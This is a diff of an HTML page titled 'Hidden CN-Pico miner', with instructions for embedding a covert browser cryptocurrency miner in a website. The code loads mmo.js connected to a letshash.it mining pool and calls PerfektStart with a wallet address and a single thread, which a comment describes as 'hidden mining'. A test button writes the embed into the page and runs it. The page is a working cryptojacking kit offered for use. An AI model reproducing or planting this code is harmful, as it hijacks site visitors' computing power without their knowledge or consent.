@@ -1,12 +1,39 @@
-Stats - here <a href="https://letshash.it/sau/#worker_stats">https://letshash.it/sau/#worker_stats</a><br>
+<html>
+<body style="background-image: url(images/gold_seamless2.jpg);">
+<div style="background-color: #ffff66; opacity: 0.75;">
+<h1>Hidden CN-Pico miner.</h1>
+<br>
+To add this miner on your web page:<br>
+1. <a href="./scripts/mmo.js">Download "./scripts/mmo.js"</a>, and put this in the folder "./scripts/mmo.js"<br>
+2. Add the following code on your web-page (and change the values, there):<br>
+
+<textarea rows="15" cols="150" id="IntegrateHiddenMiner">
+Stats - here &lt;a href="https://letshash.it/sau/#worker_stats"&gt;https://letshash.it/sau/#worker_stats&lt;/a&gt;&lt;br&gt;
 Address: Xau1aJNVtTH8rpSXA2UijkFxpQu3kYeGFCtEzTtgVvmeYTJzYpxM4R3ZgeUuog3RT9JFuens9FVtxJCKLBjNfJ3w12WynpH296
 
-<script src="./scripts/mmo.js?v9?perfekt=wss://?algo=cn-pico/trtl?jason=letshash.it:6560">//pool
-</script>
-<script>
+&lt;script src="./scripts/mmo.js?v9?perfekt=wss://?algo=cn-pico/trtl?jason=letshash.it:6560"&gt;//pool
+&lt;/script&gt;
+&lt;script&gt;
 PerfektStart(
-	"Xau1aJNVtTH8rpSXA2UijkFxpQu3kYeGFCtEzTtgVvmeYTJzYpxM4R3ZgeUuog3RT9JFuens9FVtxJCKLBjNfJ3w12WynpH296",				//login
+	"Xau1aJNVtTH8rpSXA2UijkFxpQu3kYeGFCtEzTtgVvmeYTJzYpxM4R3ZgeUuog3RT9JFuens9FVtxJCKLBjNfJ3w12WynpH296",			//login
 	"Xau1aJNVtTH8rpSXA2UijkFxpQu3kYeGFCtEzTtgVvmeYTJzYpxM4R3ZgeUuog3RT9JFuens9FVtxJCKLBjNfJ3w12WynpH296@letsTESTit",	//password
-	1																//number of threads (1 means just 1 thread with - hidden mining)
+	1			//number of threads (1 means just 1 thread with - hidden mining)
 );
+&lt;/script&gt;
+</textarea>
+
+<br>
+
+3. Load that page, with hidden-miner code.<br>
+
+<a href="#" onclick="RunTestCode();">Run this test code, to test it.</a>
+
+<script>
+	function RunTestCode(){
+		document.write(document.getElementById('IntegrateHiddenMiner').value);
+		return false;
+	}
 </script>
+</div>
+</body>
+</html>
